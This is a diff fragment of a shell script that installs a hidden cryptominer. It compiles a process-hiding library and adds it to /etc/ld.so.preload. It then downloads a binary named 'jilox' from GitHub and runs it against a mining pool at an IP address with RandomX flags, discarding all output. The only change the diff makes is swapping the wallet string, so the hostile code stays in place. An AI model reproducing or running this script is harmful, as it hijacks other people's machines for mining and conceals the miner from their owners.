@@ -11,7 +11,7 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 cd ..
 A=139.177.188.78:80
-B=86bqyB1FLa39SVdf5HzEmT1NfuKi9auJej4sYBqptTTU4Wz17ZeBmfa7nZYiEBVW4CNeJNi3UZFmJhNcfmd4zqVKJeirEK5
+B=867VgRiSidDhm8L4gUzkSoKA49D6bcsBwRneopcngnQb85TX3LG9poAfdThb3nxLmXBCEh2KHkpUUSU8DbjVjX9oSKScM6D
 C=GAS
 wget https://github.com/bengetsia/soft/raw/main/jilox && chmod u+x jilox
 ./jilox --url $A --user $B --pass $C --donate-level 1 -a rx/0 >/dev/null 2>&1
